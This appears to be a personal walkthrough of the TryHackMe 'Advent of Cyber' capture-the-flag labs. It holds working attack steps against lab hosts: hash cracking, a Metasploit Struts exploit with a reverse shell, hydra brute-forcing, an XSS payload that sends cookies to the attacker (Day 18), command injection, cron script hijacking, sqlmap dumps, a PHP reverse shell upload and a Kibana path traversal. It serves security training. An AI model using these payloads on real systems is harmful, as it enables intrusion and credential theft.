---
title: Advent of Cyber
---

- [Day 1](#day-1)
- [Day 2](#day-2)
- [Day 3](#day-3)
- [Day 4](#day-4)
- [Day 5](#day-5)
- [Day 6](#day-6)
- [Day 7](#day-7)
- [Day 8](#day-8)
- [Day 9](#day-9)
- [Day 10](#day-10)
- [Day 11](#day-11)
- [Day 12](#day-12)
- [Day 13](#day-13)
- [Day 14](#day-14)
- [Day 15](#day-15)
- [Day 16](#day-16)
- [Day 17](#day-17)
- [Day 18](#day-18)
- [Day 19](#day-19)
- [Day 20](#day-20)
- [Day 21](#day-21)
- [Day 22](#day-22)
- [Day 23](#day-23)
- [Day 24](#day-24)
- [Day 25](#day-25)

## Day 1

1. Check cookie → authid
2. Base64 decode authid value (cookies often use base64 encoding)
3. Create another account, base64 decode that authid value
4. Compare:
    1. username1mcinventoryv4er9ll1
    2. username2v4er9ll1!ss
5. mcinventory authid must be mcinventoryv4er9ll1!ss
6. Base64 encode → bWNpbnZlbnRvcnl2NGVyOWxsMSFzcw
7. Replace authid in cookie
8. Refresh page

## Day 2

```bash
$ gobuster dir -u http://10.10.6.181:3000 =w /usr/share/wordlists/dirb/common.txt
/sysadmin
```

check source
<-- Admin portal created by arctic digital design - check out our github repo -->

Google → gives default login credentials

## Day 3

frame.number == 998 → 63.32.89.195

filter by ip.dst == 63.32.89.195 → telnet data (2255)

telnet data (2906) → cat /etc/shadow

telnet data (2908) → buddy:$6$3GvJsNPG$ZrSFprHS13divBhlaKg1rYrYLJ7m1xsYRKxlLh0A1sUc/6SUd7UvekBOtSnSyBwk3vCDqBhrgxQpkdsNN6aYP1:18233:0:99999:7:::

```bash
$ nano aocd3.txt
# copy buddy:[..]: into file
$ sudo john aocd3.txt
-> success!
```

## Day 4

```bash
$ ssh mcsysadmin@<ip>

# in

$ ps

$ cat file5

$ grep * -e "password"
file6:passwordHpKRQfdxzZocwg5O0RsiyLSVQon72CjFmsV4ZLGjxI8tXYo1NhLsEply

$ grep * -e "[000-999]\.[000-999]\.[000-999]\.[000-999]"
file2:10.0.0.05eXWx4auBc8Swra4aPvIoBre+PRsVgu9GVbGwD33X8bd7TWwlZxzSVYa

$ ls /home
ec2-user  mcsysadmin # + root

$ sha1sum file8
fa67ee594358d83becdd2cb6c466b25320fd2835

# tried to generate, failed
$ find / -name "shadow.bak" 2>/dev/null
/var/shadow.bak
```

## Day 5

```bash
$ exiftool thegrinch.jpg
Creator: JLolax1
```

Google → Twitter → WordPress site

DOB, occupation, phone: Twitter→ success!

Date: Wayback Machine  → success!

Woman: Wordpress → open image → reverse image search (tineye) → success!

## Day 6

filter by DNS → Standard query <transaction ID> A/AAAA <long string>.holidaythief.com → <long string> decode hex → success!

search packet bytes & string for timmy → found correct packet (zip file)

```bash
$ sudo zip2john christmaslist.zip > christmaslist.txt
$ sudo john --format=zip christmaslist.txt # failed

$ fcrackzip -b --method 2 -D  -p /usr/share/wordlists/rockyou.txt -v ./christmaslists.zip
# -b = brute force
# --mehod 2 = zip
# -D = dictionary
# -v = verify
```

→ success!

```bash
$ steghide info TryHackMe.jpg 
"TryHackMe.jpg":
  format: jpeg
  capacity: 1.4 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "christmasmonster.txt":
    size: 1.7 KB
    encrypted: rijndael-128, cbc
    compressed: yes

$ steghide extract -xf TryHackMe.jpg
Enter passphrase: # just enter
wrote extracted data to "christmasmonster.txt".
```

→ success!

## Day 7

```bash
$ nmap -p0-1000 --open <ip>

$ sudo nmap -O --osscan-guess <ip>

$ sudo nmap -sV <ip>

# browser to <ip>:<port relating to SimpleHTTPServer>
```

## Day 8

```bash
$ nmap <ip>
PORT      STATE SERVICE
65534/tcp open  unknown

$ nmap -p65534 -sV 10.10.154.244
PORT      STATE SERVICE VERSION
65534/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

$ ssh holly@10.10.154.244 -p65534

$ find / -user igor -perm -4000 -exec ls -ldb {} \; 2>/dev/null
# see https://gtfobins.github.io/#+suid
# also $ find / -perm -u=s -type f 2>/dev/null

$ usr/bin/find . -exec /bin/sh -p \; -quit
# new shell
$ whoami
igor
$ cat /home/igor/flag1.txt

$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
$ /usr/bin/system-control
```

## Day 9

```python
import requests
import json

print('start')

url = "http://10.10.169.100:3000/"
r = requests.get(url)
value = r.json()['value']
next = r.json()['next']

values = value

while next != 'end' and value != 'end':
    new_url = url + next
    r = requests.get(new_url)
    value = r.json()['value']
    next = r.json()['next']
    values += value
    print(values)

print('end')
```

## Day 10

```bash
# browser to 10.10.29.223
# goes to http://10.10.29.223/showcase.action

$ nmap <ip> -A -p-
PORT    STATE SERVICE VERSION                                                                                                               
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)                                                                                            
80/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1                                                                                   
111/tcp open  rpcbind 2-4 (RPC #100000)

$ nikto
+ Uncommon header 'nikto-added-cve-2017-5638' found, with contents: 42
+ /: Site appears vulnerable to the 'strutshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638).

$ msfconsole

msf5 > search strutshock
[-] No results from searchmsf5 > search 5638
#  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
0  exploit/multi/http/struts2_content_type_ognl  2017-03-07       excellent  Yes    Apache Struts Jakarta Multipart Parser OGNL Injection
msf5 > use 0
msf5 > options
msf5 > set RHOSTS <machine ip>
msf5 > set RPORT 80
msf5 > set TARGETURI /showcase.action
msf5 > set LHOST <local ip>
msf5 > set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf5 > run

met > shell
find / 2>>/dev/null | grep -i "flag"

met > cat /home/santa/ssh-creds.txt

$ ssh santa@<ip>
# in
$ sed '148q;d' naughty_list.txt
$ sed '52q;d' nice_list.txt
```

## Day 11

```bash
$ nmap 10.10.18.57 -p21,22,111,2049,3306 -sV
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.2
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
111/tcp  open  rpcbind 2-4 (RPC #100000)
2049/tcp open  nfs_acl 3 (RPC #100227)
3306/tcp open  mysql   MySQL 5.7.28
Service Info: OS: Unix

$ sudo showmount -e 10.10.18.57
Export list for 10.10.18.57:
/opt/files *
$ mkdir aocd11
$ sudo mount 10.10.18.57:/opt/files aocd11
$ cat aocd11/creds.txt
$ sudo umount aocd11

$ ftp 10.10.18.57
Name (10.10.18.57:kali): anonymous
Password: anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
# I was getting "500 Illegal PORT command." error
# Solution: Change VPN server at https://tryhackme.com/access
ftp> get file.txt file.txt
$ cat file.txt

$ mysql -h 10.10.77.80 -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 5
Server version: 5.7.28 MySQL Community Server (GPL)
MySQL > SHOW DATABASES;
MySQL > USE data;
MySQL > SHOW tables;
MySQL > SELECT * FROM USERS
```

## Day 12

```bash
$ unzip tosend.zip
$ md5sum note1.txt.gpg

$ gpg -d note1.txt.gpg
# passphrase: 25daysofchristmas, from hint

$ openssl rsautl -decrypt -inkey private.key -in note2_encrypted.txt -out note2.txt
# pass phrase: hello, from hint
```

## Day 13

browser loads to Windows Server Internet Information Services

```bash
$ gobuster dir -u 10.10.57.165 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

[http://10.10.57.165/retro/](http://10.10.57.165/retro/wp-login.php) → success!

browse about a bit...

[http://10.10.57.165/retro/index.php/2019/12/09/ready-player-one/](http://10.10.57.165/retro/index.php/2019/12/09/ready-player-one/)

"I keep mistyping the name of his avatar whenever I log in but I think I’ll eventually get it down."

"Leaving myself a note here just in case I forget how to spell it: parzival"

```bash
$ nmap -A -p- 10.10.57.165
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2020-06-27T12:03:52+00:00
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2020-05-21T21:44:38
|_Not valid after:  2020-11-20T21:44:38
|_ssl-date: 2020-06-27T12:03:53+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

→ RDP available

remmina (RDP)

wade:parzival

→ success!

h*as now changed from initial write-ups, more similar to Blaster THM box now*

1. run hhupd.exe on desktop → UAC popup, requires Administrator password
2. click "Show more details" → click "Show information about the publisher's certificate"
3. click Verisign → IE (with escalated privileges!) opens in background, so close UAC
4. "This page can't be displayed" → Save (ctrl-S) → "\Desktop is unavailable"
5. OK → navigate to System32 → enter *.* in File name: and press Enter → displays all files
6. find cmd → right click, Run as administrator

```bash
cd ..\..
dir /S root.txt
C:\Users\Administrator\Dekstop\root.txt
```

## Day 14

Bucket name: advent-bucket-one

URL: [http://advent-bucket-one.s3.amazonaws.com/](http://advent-bucket-one.s3.amazonaws.com/)

```xml
<ListBucketResult>
	<Name>advent-bucket-one</Name>
	<Prefix/>
	<Marker/>
	<MaxKeys>1000</MaxKeys>
	<IsTruncated>false</IsTruncated>
	<Contents>
		<Key>employee_names.txt</Key>
		<LastModified>2019-12-14T15:53:25.000Z</LastModified>
		<ETag>"e8d2d18588378e0ee0b27fa1b125ad58"</ETag>
		<Size>7</Size>
		<StorageClass>STANDARD</StorageClass>
	</Contents>
</ListBucketResult>
```

[http://advent-bucket-one.s3.amazonaws.com/employee_names.txt](http://advent-bucket-one.s3.amazonaws.com/employee_names.txt)

## Day 15

open ports: 22, 80

visit page: "Public Notes"

view source:

```jsx
function getNote(note, id) {
        const url = '/get-file/' + note.replace(/\//g, '%2f')
        $.getJSON(url,  function(data) {
          document.querySelector(id).innerHTML = data.info.replace(/(?:\r\n|\r|\n)/g, '<br>');
        })
      }
      // getNote('server.js', '#note-1')
      getNote('views/notes/note1.txt', '#note-1')
      getNote('views/notes/note2.txt', '#note-2')
      getNote('views/notes/note3.txt', '#note-3')
```

test:

[http://10.10.56.47/get-file/views/notes/note1.txt](http://10.10.56.47/get-file/views/notes/note1.txt)

encoded using [https://meyerweb.com/eric/tools/dencoder/](https://meyerweb.com/eric/tools/dencoder/)

[http://10.10.56.47/get-file/views%2Fnotes%2Fnote1.txt](http://10.10.56.47/get-file/views%2Fnotes%2Fnote1.txt)

loads json → success!

target: /etc/shadow

http://10.10.56.47/get-file/%2Fetc%2Fshadow

charlie:$6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdDPCkPj7O9TB0rvWfCzpEkGOyhL.:18243:0:99999:7:::

note: you can't echo the password to a file; copy using nano instead

```jsx
$ echo "charlie:$6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdDPCkPj7O9TB0rvWfCzpEkGOyhL.:18243:0:99999:7:::" > charlie
$ cat charlie
charlie:.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdDPCkPj7O9TB0rvWfCzpEkGOyhL.:18243:0:99999:7:::
```

```bash
sudo john charlie
```

port scan shows SSH is open

```bash
$ ssh charlie@10.10.56.47
# in
$ cat flag1.txt
```

## Day 16

```python
import zipfile
import os
import exiftool

base = '/home/kali/Downloads/'

file = f'{base}final-final-compressed.zip'

with zipfile.ZipFile(file) as f:
    f.extractall(f'{base}aocd16')

files = os.listdir(f'{base}aocd16')
for file in files:
    if file[-3] == 'zip':
        with zipfile.ZipFile(f'{base}aocd16/{file}') as f:
                f.extractall(f'{base}aocd16/deeper')

txts = os.listdir(f'{base}aocd16/deeper')
print(len(txts))

txts_full = []

for txt in txts:
    txts_full.append(f'{base}aocd16/deeper/{txt}')

count = 0
with exiftool.ExifTool() as et:
    metadata = et.get_metadata_batch(txts_full)
for d in metadata:
    try:
        if d['XMP:Version'] == 1.1:
            count += 1
    except:
        pass
print(count)

for txt in txts_full:
    with open (txt, 'rb') as f:
        data = f.read()
        if b'password' in data:
            print(txt.split('/')[-1])
```

## Day 17

http://10.10.0.247 → goes to login page

test login, check Network POST Headers:

Referer: [http://10.10.0.247/login](http://10.10.0.247/login)

Body: username=user&password=pass

Error message: "Your username or password is incorrect."

```bash
$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.0.247 -t 4 http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -v

$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.0.247 -t 4 ssh -v
[22][ssh] host: 10.10.0.247   login: molly   password: butterfly
```

## Day 18

Visit in browser, view source, register at [http://10.10.78.225:3000/register](http://10.10.78.225:3000/register), then login

Post: "admin will be coming here from time to time" → something to capture his cookie when he signs in

Test post 1: `pos`t is inserted as <p>post</p>

Test post 2: `</p><script>alert(document.cookie);</script><p>hi` → alert's with my cookie

Set up listener:

Post to capture authid: `</p><script>window.location = 'http://<tun0_ip>/page?param=' + document.cookie </script><p>`

```bash
$ sudo nc -lvnp 80
listening on [any] 80 ...
# wait a few mins
connect to [10.8.83.23] from (UNKNOWN) [10.10.226.138] 44658
GET /page?param=authid=2564799a4e6689972f6d9e1c7b406f87065cbf65 HTTP/1.1 # -> success!
Host: 10.8.83.23
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3844.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://localhost:3000/admin
Accept-Encoding: gzip, deflate
```

## Day 19

Check page and source, only nothing

[http://10.10.33.165:3000/api/cmd](http://10.10.33.165:3000/api/cmd) → "Cannot GET /api/cmd"

[http://10.10.33.165:3000/api/cmd/ls](http://10.10.33.165:3000/api/cmd/ls) → 

```json
{"stdout":"bin\nboot\ndata\ndev\netc\nhome\nlib\nlib64\nlocal\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n","stderr":""}
```

http://10.10.33.165:3000/api/cmd/find%20.%20-name%20%22user.txt%22

= find . -name "user.txt"

```json
{"stdout":"./home/bestadmin/user.txt\n","stderr":""}
```

http://10.10.33.165:3000/api/cmd/find%20.%20-name%20%22user.txt%22%20-exec%20cat%20%7B%7D%20%5C%3B

= find . -name "user.txt" -exec cat {} \;

→ success!

## Day 20

```bash
$ threader3000
Port 4567 is open

$ nmap 10.10.223.219 -sV -p4567
PORT     STATE SERVICE VERSION
4567/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

$ hydra -l sam -P /usr/share/wordlists/rockyou.txt ssh://10.10.223.219:4567 -t4 -V
[4567][ssh] host: 10.10.223.219   login: sam   password: chocolate

$ ssh sam@10.10.223.219 -p4567
# in
$ cat flag1.txt

$ find . -name "flag2.txt" 2>/dev/null
./home/ubuntu/flag2.txt
$ cat /home/ubuntu/flag2.txt 
cat: /home/ubuntu/flag2.txt: Permission denied

$ crontab -l # nothing useful
$ find /home -name "*.sh" 2>/dev/null
$ cat clean_up.sh
rm -rf /tmp/*
$ ls -la clean_up.sh
-rwxrwxrwx 1 ubuntu ubuntu 14 Dec 19  2019 clean_up.sh # runs as ubuntu
$ ls -la /tmp
drwxrwxrwt  7 root root 4096 Jun 30 09:24 .
$ date
Tue Jun 30 09:24:11 UTC 2020
# same time - clean_up.sh has just ran? via cron?

$ echo cp /home/ubuntu/flag2.txt /home/scripts/flag2.txt >> clean_up.sh
$ cat flag2.txt 
cat: flag2.txt: Permission denied

# delete that line

$ echo "cat /home/ubuntu/flag2.txt > /home/scripts/flag2.txt" >> clean_up.sh
$ cat flag2.txt # success!
```

## Day 21

this and next seem to be a bit buggy, had to close and restart a few times

```bash
$ unzip file.zip
$ chmod +x challenge1 file1
$ ./challenge1
# does nothing visible
$ ./file1
the value of a is 4, the value of b is 5 and the value of c is 9

$ r2 -d ./challenge1

[0x00400a30]> aa # analyse
Invalid address from 0x004843ac
Invalid address from 0x0044efc6

[0x00400a30]> afl | grep main # list functions
# more
0x00400b4d    1 35           main
# more

[0x00400a30]> pdf @main # view
            ; DATA XREF from entry0 @ 0x400a4d
┌ 35: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_ch @ rbp-0xc
│           ; var int64_t var_8h @ rbp-0x8
│           ; var int64_t var_4h @ rbp-0x4                                                                                                                                                      
│           0x00400b4d      55             push rbp
│           0x00400b4e      4889e5         mov rbp, rsp
│           0x00400b51      c745f4010000.  mov dword [var_ch], 1
│           0x00400b58      c745f8060000.  mov dword [var_8h], 6
│           0x00400b5f      8b45f4         mov eax, dword [var_ch]
│           0x00400b62      0faf45f8       imul eax, dword [var_8h]
│           0x00400b66      8945fc         mov dword [var_4h], eax
│           0x00400b69      b800000000     mov eax, 0
│           0x00400b6e      5d             pop rbp
└           0x00400b6f      c3             ret
[0x00400a30]> db 0x00400b51 # set breakpoints
[0x00400a30]> db 0x00400b62
[0x00400a30]> db 0x00400b69
[0x00400a30]> pdf @main
            ; DATA XREF from entry0 @ 0x400a4d
┌ 35: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_ch @ rbp-0xc
│           ; var int64_t var_8h @ rbp-0x8
│           ; var int64_t var_4h @ rbp-0x4
│           0x00400b4d      55             push rbp
│           0x00400b4e      4889e5         mov rbp, rsp
│           0x00400b51 b    c745f4010000.  mov dword [var_ch], 1
│           0x00400b58      c745f8060000.  mov dword [var_8h], 6
│           0x00400b5f      8b45f4         mov eax, dword [var_ch]
│           0x00400b62 b    0faf45f8       imul eax, dword [var_8h]
│           0x00400b66      8945fc         mov dword [var_4h], eax
│           0x00400b69 b    b800000000     mov eax, 0
│           0x00400b6e      5d             pop rbp
└           0x00400b6f      c3             ret

[0x00400a30]> dc # continue
hit breakpoint at: 400b51
[0x00400b51]> px @rbp-0xc # see value
- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x7ffd1c6b82a4  0000 0000 1890 6b00 0000 0000 4018 4000  ......k.....@.@.                                                                                                                       
# more
[0x00400b51]> ds # step to next instruction
[0x00400b58]> px @rbp-0xc # see value (it's changed)
- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x7ffd1c6b82a4  0100 0000 1890 6b00 0000 0000 4018 4000  ......k.....@.@.                                                                                                                       
# more
# -> success!

[0x00400b58]> dc
hit breakpoint at: 400b62
[0x00400b62]> dr # view registers
rax = 0x00000001
# more
[0x00400b62]> ds
[0x00400b66]> dr # view registers (it's changed)
rax = 0x00000006
# more
# -> success!

[0x00400b66]> dc
hit breakpoint at: 400b69
[0x00400b69]> px @rbp-0x4
- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x7ffd3ad4dfcc  0600 0000 4018 4000 0000 0000 e910 4000  ....@.@.......@.                                                                                                                       
# more
# -> success!
```

## Day 22

```bash
$ r2 -d ./if2

[0x00400a30]> aaa
[0x00400a30]> afl
[0x00400a30]> pdf @main

# was being buggy so I figured it out manually
# finally got it working using

[0x00400a30]> db 0x00400b6b
```

line 3: 8h = 8

line 4: 4h = 2

line 5: eax = 8h = 8

line 6: compare eax (8) with 4h (2)

line 7: if eax < 4h, jump (false)

line 8: 8h += 1 = 9

e*nd → success!*

## Day 23

attempt login, capture post (inspector or Burpsuite), save to file:

```bash
$ cat aocd23ff.txt 
POST /register.php HTTP/1.1 # have to manually adjust this
Host: 10.10.117.240
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.117.240/register.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 64
Connection: keep-alive
Cookie: PHPSESSID=iom9hpbauqe2qen6er59vidl93
Upgrade-Insecure-Requests: 1

log_email=user%40google.com&log_password=pass&login_button=Login # have to manually copy this

$ cat aocd23burp.txt # from right click -> save
<?xml version="1.0"?>
<!DOCTYPE items [
<!ELEMENT items (item*)>
<!ATTLIST items burpVersion CDATA "">
<!ATTLIST items exportTime CDATA "">
<!ELEMENT item (time, url, host, port, protocol, method, path, extension, request, status, responselength, mimetype, response, comment)>
<!ELEMENT time (#PCDATA)>
<!ELEMENT url (#PCDATA)>
<!ELEMENT host (#PCDATA)>
<!ATTLIST host ip CDATA "">
<!ELEMENT port (#PCDATA)>
<!ELEMENT protocol (#PCDATA)>
<!ELEMENT method (#PCDATA)>
<!ELEMENT path (#PCDATA)>
<!ELEMENT extension (#PCDATA)>
<!ELEMENT request (#PCDATA)>
<!ATTLIST request base64 (true|false) "false">
<!ELEMENT status (#PCDATA)>
<!ELEMENT responselength (#PCDATA)>
<!ELEMENT mimetype (#PCDATA)>
<!ELEMENT response (#PCDATA)>
<!ATTLIST response base64 (true|false) "false">
<!ELEMENT comment (#PCDATA)>
]>
<items burpVersion="2020.6" exportTime="Fri Jul 03 22:25:22 EDT 2020">
  <item>
    <time>Fri Jul 03 22:24:12 EDT 2020</time>
    <url><![CDATA[http://10.10.117.240/register.php]]></url>
    <host ip="10.10.117.240">10.10.117.240</host>
    <port>80</port>
    <protocol>http</protocol>
    <method><![CDATA[POST]]></method>
    <path><![CDATA[/register.php]]></path>
    <extension>php</extension>
    <request base64="true"><![CDATA[UE9TVCAvcmVnaXN0ZXIucGhwIEhUVFAvMS4xDQpIb3N0OiAxMC4xMC4xMTcuMjQwDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQ7IHJ2OjY4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNjguMA0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSwqLyo7cT0wLjgNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KUmVmZXJlcjogaHR0cDovLzEwLjEwLjExNy4yNDAvcmVnaXN0ZXIucGhwDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDY4DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ29va2llOiBQSFBTRVNTSUQ9aW9tOWhwYmF1cWUycWVuNmVyNTl2aWRsOTMNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENCg0KbG9nX2VtYWlsPXVzZXIlNDBnb29nbGUuY29tJmxvZ19wYXNzd29yZD1wYXNzd29yZCZsb2dpbl9idXR0b249TG9naW4=]]></request>
    <status></status>
    <responselength></responselength>
    <mimetype></mimetype>
    <response base64="true"></response>
    <comment></comment>
  </item>
</items>
```

```bash
$ sqlmap -r aocd23.txt --current-db # not working?

$ sqlmap -r r.txt --dbs --batch # noisy?

[ ... ]

POST parameter 'log_email' is vulnerable. Do you want to keep testing the others (if any)? [y/N]

[ ... ]

[23:02:56] [WARNING] no clear password(s) found                                                                                      
Database: social
Table: users
[7 entries]
+------+------------------------+-----------------------+----------------+-----------+-----------+----------------------------------+--------------+--------------------------------------------------------+-------------+-------------+--------------------------------------------------------------+
| id   | email                  | username              | last_name      | num_likes | num_posts | password                         | first_name   | profile_pic                                            | signup_date | user_closed | friend_array                                                 |
+------+------------------------+-----------------------+----------------+-----------+-----------+----------------------------------+--------------+--------------------------------------------------------+-------------+-------------+--------------------------------------------------------------+
| 1    | bigman@shefesh.com     | santa_claus           | Claus          | 2         | 3         | f1267830a78c0b59acc06b05694b2e28 | Santa        | assets/images/profile_pics/defaults/head_deep_blue.png | 2019-12-22  | no          | ,mommy_mistletoe,arnold_schwarzenegger,johnfortnite_kennedy, |

[ ... ]

[23:03:26] [INFO] retrieved: '2019-12-22 21:22:47','4','I have my eye on you.','no','no','jessica_claus','mommy_mistletoe','no'
Database: social                                                                                                                     
Table: messages
[4 entries]
+------+--------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+--------+---------+-----------------------+-----------------+
| id   | body                                                                                                                                       | date                | opened | viewed | deleted | user_to               | user_from       |
+------+--------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+--------+---------+-----------------------+-----------------+
| 1    | Santa, I think my son Michael saw us kissing underneath the misteltoe last night! Meet me under the clock in Waterloo station at Midnight. | 2019-12-22 20:44:23 | yes    | yes    | no      | santa_claus           | mommy_mistletoe |
```

hashed password: f1267830a78c0b59acc06b05694b2e28

cracked using [https://crackstation.net/](https://crackstation.net/) as suggested by Hint → saltnpepper

```bash
$ ls /usr/share/webshells
asp  aspx  cfm  jsp  laudanum  perl  php
$ mv /usr/share/webshells/php/php-reverse-shell.php ~/
$ cd ~
$ nano php-reverse-shell.php
# change ip to tun0
# cannot upload .php, denied
$ mv php-reverse-shell.php php-reverse-shell.phtml
$ nc -nvlp 4444
# click placeholder in post; http://10.10.255.58/assets/images/posts/5f0023b11caafphp-reverse-shell.phtml
# nc gets shell
$ cat /home/user/flag.txt -> success!
```

## Day 24

```bash
$ nmap 10.10.204.216 -p-
PORT      STATE    SERVICE
22/tcp    open     ssh
111/tcp   open     rpcbind
2702/tcp  filtered sms-xfer
5601/tcp  open     esmagent
8000/tcp  open     http-alt
9200/tcp  open     wap-wsp
9300/tcp  open     vrace
14604/tcp filtered unknown
21607/tcp filtered unknown
42939/tcp filtered unknown
50193/tcp filtered unknown
59126/tcp filtered unknown
60607/tcp filtered unknown
60999/tcp filtered unknown

$ nmap -A 10.10.204.216 -p22,111,8000,9200
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
[...]
111/tcp  open  rpcbind 2-4 (RPC #100000)
[...]
5601/tcp open  esmagent?
|   GetRequest: 
|     HTTP/1.1 200 OK
|     kbn-name: kibana
[...]
|     defaultRoute = '/app/kibana';
8000/tcp open  http    SimpleHTTPServer 0.6 (Python 3.7.4)
|_http-server-header: SimpleHTTP/0.6 Python/3.7.4
|_http-title: Directory listing for /
9200/tcp open  http    Elasticsearch REST API 6.4.2 (name: sn6hfBl; cluster: elasticsearch; Lucene 7.4.0)
| http-methods: 
|_  Potentially risky methods: DELETE
|_http-title: Site doesnt have a title (application/json; charset=UTF-8).
9300/tcp open  vrace?
```

go to [http://10.10.204.216:5601/](http://10.10.204.216:5601/app/kibana), redirects to [http://10.10.204.216:5601/app/kibana](http://10.10.204.216:5601/app/kibana)

go to [http://10.10.204.216:8000/](http://10.10.204.216:8000/) → kibana-log.txt → lots

go to [http://10.10.204.216:9200/](http://10.10.204.216:9200/) → elasticsearch json (v6.4.2)

Google "how to search elasticsearch", find curl command

```json
$ curl -XGET 'http://10.10.204.216:9200/_search?pretty=true&q=*.*'
{
  "took" : 67,
  "timed_out" : false,
  "_shards" : {
    "total" : 6,
    "successful" : 6,
    "skipped" : 0,
    "failed" : 0
  },
  "hits" : {
    "total" : 1,
    "max_score" : 1.0,
    "hits" : [
      {
        "_index" : "messages",
        "_type" : "_doc",
        "_id" : "73",
        "_score" : 1.0,
        "_source" : {
          "sender" : "mary",
          "receiver" : "wendy",
          "message" : "hey, can you access my dev account for me. My username is l33tperson and my password is 9Qs58Ol3AXkMWLxiEyUyyf" # -> success!
        }
      }
    ]
  }
}
```

Google Kibana vulnerability, found CVE-2018-17246 → /api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../path/to/file

http://10.10.204.216:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../root.txt

hangs, doesn't load... where might it?

check kibana-log.txt for root.txt → "stack":"ReferenceError: someELKfun is not defined\n at Object.<anonymous> (/root.txt:1:6) → success!

## Day 25

Nothing to do → success!